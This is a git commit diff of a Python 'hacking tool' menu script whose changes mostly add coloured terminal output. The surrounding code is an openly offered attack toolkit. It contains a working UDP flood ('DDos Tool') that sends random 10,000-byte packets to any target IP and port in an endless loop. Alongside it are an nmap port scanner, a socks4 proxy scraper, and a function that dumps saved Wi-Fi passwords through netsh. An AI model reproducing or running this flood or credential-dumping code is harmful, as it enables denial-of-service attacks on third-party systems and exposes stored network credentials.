1b4e3f7fe044576b82dfba856660034187c81c0d
Apkaless <54741624+Apkaless@users.noreply.github.com>
2021-02-01 23:14:18 +0300

    Add files via upload

--- ApkalessTool.py
+++ ApkalessTool.py
@@ -8,6 +8,8 @@ import proxyscrape
 import subprocess
 import os
 from pafy import new
+import colorama
+from colorama import Fore, Back, Style
 # code started
 
 # This is Code For Hostname Tool
@@ -20,24 +22,24 @@ def gethostbyname1():
      #  print("""Welcome To IP Tool\n
      #      Creator: Apkaless\n
      #      Country: Iraq\n""")
-      hostname = input(str("Enter Any Host Name: "))
+      hostname = input(str(Fore.GREEN + "Enter Any Host Name: "))
       ipaddress = socket.gethostbyname(hostname)
       time.sleep(1)
       print("")
-      print("IP Address of the hostname {} is: {}" .format(hostname, ipaddress))
+      print(Fore.GREEN + "IP Address of the hostname {} is : {}" .format(hostname, Fore.BLUE + ipaddress))
       time.sleep(1)
       print("")
-      print("This Tool Was Created By Apkaless ☣")
+      print(Fore.GREEN + "This Tool Was Created By Apkaless ☣")
       time.sleep(1)
       print("")
-      print("Thanks For Using My Tool ☣")
+      print(Fore.GREEN + "Thanks For Using My Tool ☣")
       time.sleep(1)
       print("")
-      print("""Select An Action:\n
+      print(Fore.GREEN + """Select An Action:\n
                1) DDos IP
                2) Scan IP
                3) Exit\n""")
-      answer = input("Choose Option: ")
+      answer = input(Fore.GREEN + "Choose Option: ")
       if answer == "1":
            ddostool()
       elif answer == "2":
@@ -64,32 +66,32 @@ def ddostool():
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      bytes = random._urandom(10000)
      #####################################################
-     host = input("Target IP: ")
+     host = input(Fore.GREEN + "Target IP: ")
      time.sleep(1)
      print("")
-     print("The Default Port is 80")
+     print(Fore.GREEN + "The Default Port is 80")
      time.sleep(1)
      print("")
-     port = int(input("Port: "))
+     port = int(input(Fore.GREEN + "Port: "))
      sent = 0
      os.system("clear")
      os.system("figlet DDos Starting.....")
      time.sleep(2)
-     print("[=======] 0%")
+     print(Fore.GREEN + "[=======] 0%")
      time.sleep(1)
-     print("[===============] 25%")
+     print(Fore.GREEN + "[===============] 25%")
      time.sleep(2)
-     print("[======================] 50%")
+     print(Fore.GREEN + "[======================] 50%")
      time.sleep(3)
-     print("[==========================] 75%")
+     print(Fore.GREEN + "[==========================] 75%")
      time.sleep(4)
-     print("[===============================] 100%")
+     print(Fore.GREEN + "[===============================] 100%")
      time.sleep(5)
      while True:
           s.connect((host,port))
           s.sendto(bytes, (host,port))
           sent = sent + 1
-          print("Attacking %s packets to %s on port %s %s" %(sent,host,port,"By Apkaless"))
+          print(Fore.GREEN + "Attacking %s packets to %s on port %s %s" %(sent,host,port,"By Apkaless"))
           if port == 66534:
                port = 1
 
@@ -108,44 +110,44 @@ def scanner():
      os.system("figlet IP SCANNER")
      print("")
      nmScan = nmap.PortScanner()
-     host = input("Enter The IP Address You Want To Scan: ")
+     host = input(Fore.GREEN + "Enter The IP Address You Want To Scan: ")
      print("")
      time.sleep(1)
-     print("Your IP Address is:",host)
+     print(Fore.GREEN + "Your IP Address is:",Fore.BLUE + host)
      print("")
      time.sleep(1)
      # print("Thanks For Using My Tool")
      # time.sleep(1)
-     res = input("""Please Select A Method:\n
+     res = input(Fore.GREEN + """Please Select A Method:\n
                1) SYN ACK Scan
                2) UDP Scan\n
                Option --> """)
      time.sleep(1)
      print("")
-     print("You Selected Option: ",res)
+     print(Fore.GREEN + "You Selected Option: ",Fore.BLUE + res)
      print("")
      if res == "1": # SYN ACK SCAN 
-          print("Nmap Version",nmScan.nmap_version())
+          print(Fore.GREEN + "Nmap Version",nmScan.nmap_version())
           print("")
           time.sleep(1)
-          print("Scanning.....")
+          print(Fore.GREEN + "Scanning.....")
           print("")
           nmScan.scan(host,'1-1024','-sV')
           print(nmScan.scaninfo())
           print("")
           for host in nmScan.all_hosts():
-               print("Host: %s" %(host))
+               print(Fore.GREEN + "Host: %s" %(Fore.BLUE + host))
                print("")
-               print("State: %s" %(nmScan[host].state()))
+               print(Fore.GREEN + "State: %s" %(nmScan[host].state()))
                print("")
           for proto in nmScan[host].all_protocols():
-               print("Protocol: %s" %(proto))
+               print(Fore.GREEN + "Protocol: %s" %(Fore.BLUE + proto))
                print("")
                for key in nmScan[host]['tcp'].keys():
                     print("--------------------")
-                    print("Port: %s %s %s \n" %(key,proto,nmScan[host].tcp(key)))
+                    print(Fore.GREEN + "Port: %s %s %s \n" %(Fore.BLUE + key,proto,nmScan[host].tcp(key)))
           print("")
-          input("Press Enter To Back..... ")
+          input(Fore.GREEN + "Press Enter To Back..... ")
           starting()
      elif res == "2":
           print("Nmap Version",nmScan.nmap_version())
@@ -153,13 +155,13 @@ def scanner():
           nmScan.scan(host,'1-1024','-v -sU')
           print(nmScan.scaninfo())
           for host in nmScan.all_hosts():
-               print("Host: %s" %(host))
+               print("Host: %s" %(Fore.BLUE + host))
                print("State: %s" %(nmScan[host].state()))
           for protocol in nmScan[host].all_protocols():
-               print("Protocol: %s" %(protocol))
+               print("Protocol: %s" %(Fore.BLUE + protocol))
      else:
-        print("Please Select a Valid Option\n")
-        input("Press Enter To Back..... ")
+        print(Fore.GREEN + "Please Select a Valid Option\n")
+        input(Fore.GREEN + "Press Enter To Back..... ")
         starting()
 
 # This The End Of The Code
@@ -169,14 +171,14 @@ def scraper():
      os.system("figlet PROXY SCRAPER")
      collector = proxyscrape.create_collector('default','socks4')
      proxies = collector.get_proxies({'country' : 'united states'})
-     print("\nScraping Proxies.....\n")
+     print(Fore.GREEN + "\nScraping Proxies.....\n")
      time.sleep(5)
      print(proxies)
-     input("\nPress Enter To Back..... ")
+     input(Fore.GREEN + "\nPress Enter To Back..... ")
      starting()
 
 def wifiPassword():
-     print("Wifi Password Tool 2020")
+     print(Fore.GREEN + "Wifi Password Tool 2020")
      print("")
      data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
      profiles = [i.split(':')[1][1:-1] for i in data if "All User Profile" in i] # Wifi Name
@@ -186,18 +188,18 @@ def wifiPassword():
                result = [b.split(":")[1][1:-1] for b in result if "Key Content" in b] # Wifi Password
                try:
                    for password in result:
-                       print("Wifi Name: {}\n\nPassword: {}" .format(i,password))
+                       print(Fore.GREEN + "Wifi Name: {}\n\nPassword: {}" .format(Fore.BLUE + i,password))
                except IndexError:
-                    print("Wifi Name: {} Password: {}" .format(i,""))
+                    print(Fore.GREEN + "Wifi Name: {} Password: {}" .format(i,""))
           except subprocess.CalledProcessError:
-               print("Wifi Name: {} {}" .format(i,"ENCODING ERROR"))
+               print(Fore.GREEN + "Wifi Name: {} {}" .format(i,"ENCODING ERROR"))
      print("")
-     input("Coded By Apkaless ")
+     input(Fore.GREEN + "Coded By Apkaless ")
 
 def videoDownload():
      os.system("clear")
      os.system("figlet YouTube Video")
-     url = input("Enter YouTube Video Link: ")
+     url = input(Fore.GREEN + "Enter YouTube Video Link: ")
      print("")
      video = new(url)
 
@@ -208,12 +210,12 @@ def videoDownload():
           for stream in streams:
                print("\n",str(i),"-",stream,"\n")
                i += 1
-          streamNumber = int(input("Enter Number 0 OR 1 : "))
-          print("\nYour Option : ",streamNumber,"\n")
+          streamNumber = int(input(Fore.GREEN + "Enter Number 0 OR 1 : "))
+          print(Fore.GREEN + "\nYour Option : ",Fore.BLUE + streamNumber,"\n")
           streams[streamNumber].download()
-          print("\nYour Video Successfully Downloaded\n")
-          print("Your Video Path : /root\n")
-          input("Press Enter To Back..... ")
+          print(Fore.GREEN + "\nYour Video Successfully Downloaded\n")
+          print(Fore.GREEN + "Your Video Path : /root\n")
+          input(Fore.GREEN + "Press Enter To Back..... ")
           starting()
 
      def forAudio():
@@ -221,17 +223,17 @@ def videoDownload():
           audios = video.audiostreams
           a = 0
           for audio in audios:
-               print("\n",str(a),"-",audio,"\n")
+               print(Fore.GREEN + "\n",str(a),"-",audio,"\n")
                a += 1
-          audioNumber = int(input("Enter Number: "))
+          audioNumber = int(input(Fore.GREEN + "Enter Number: "))
           print("")
           audios[audioNumber].download()
-          print("\nYour Audio File Successfully Downloaded\n")
-          print("Your Audio File Path: /root\n")
-          input("Press Enter To Back.....")
+          print(Fore.GREEN + "\nYour Audio File Successfully Downloaded\n")
+          print(Fore.GREEN + "Your Audio File Path: /root\n")
+          input(Fore.GREEN + "Press Enter To Back.....")
           starting()
 
-     streamType = input("""Select Option:
+     streamType = input(Fore.GREEN + """Select Option:
                                       
                           1) Video 
 
@@ -244,21 +246,21 @@ def videoDownload():
      elif streamType == "2":
           forAudio()
      else:
-          input("Press Enter To Back.....")
+          input(Fore.GREEN + "Press Enter To Back.....")
           starting()
 
 def starting():
      os.system("clear")
      os.system("figlet Apkaless")
      print("")
-     print("Creator   : APKALESS")
-     print("Country   : IRAQ")
-     print("YouTube   : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
-     print("Github    : https://github.com/Apkaless")
-     print("Facebook  : https://www.facebook.com/Apkaless")
-     print("Instagram : https://www.instagram.com/Apkaless")
+     print(Fore.GREEN + "Creator   : APKALESS")
+     print(Fore.GREEN + "Country   : IRAQ")
+     print(Fore.GREEN + "YouTube   : https://www.youtube.com/channel/UCghQXaAH2PXS67c84b6txKw")
+     print(Fore.GREEN + "Github    : https://github.com/Apkaless")
+     print(Fore.GREEN + "Facebook  : https://www.facebook.com/Apkaless")
+     print(Fore.GREEN + "Instagram : https://www.instagram.com/Apkaless")
      print("")
-     print("""
+     print(Fore.GREEN + """
 =================================================
                created by Apkaless                 
 =================================================
@@ -292,18 +294,18 @@ def starting():
           # print("Verifying The Code....")
           # time.sleep(2)
           # print("")
-          starthacking = input("""What Do You Want?\n
-                                        1) Get IP Tool
+          starthacking = input(Fore.GREEN + """What Do You Want?\n
+                              1) Get IP Tool
 
-                                        2) Scanner Tool
+                              2) Scanner Tool
 
-                                        3) DDos Tool
+                              3) DDos Tool
 
-                                        4) Proxy Scraper
+                              4) Proxy Scraper
 
-                                        5) Wifi Password (This Option Don't Work On Linux)
+                              5) Wifi Password (This Option Don't Work On Linux)
 
-                                        6) YouTube Video Download\n
+                              6) YouTube Video Download\n
                                         
 Press Ctrl + C To Exit From This Tool.\n
           Choose Option -----> """)
@@ -321,7 +323,7 @@ Press Ctrl + C To Exit From This Tool.\n
           if starthacking == "6":
                videoDownload()
      except KeyboardInterrupt:
-          print(" \n\nHave A Nice Day ;)\n")
+          print(Fore.GREEN + " \n\nHave A Nice Day ;)\n")
 starting()
 
 # os.system("clear")
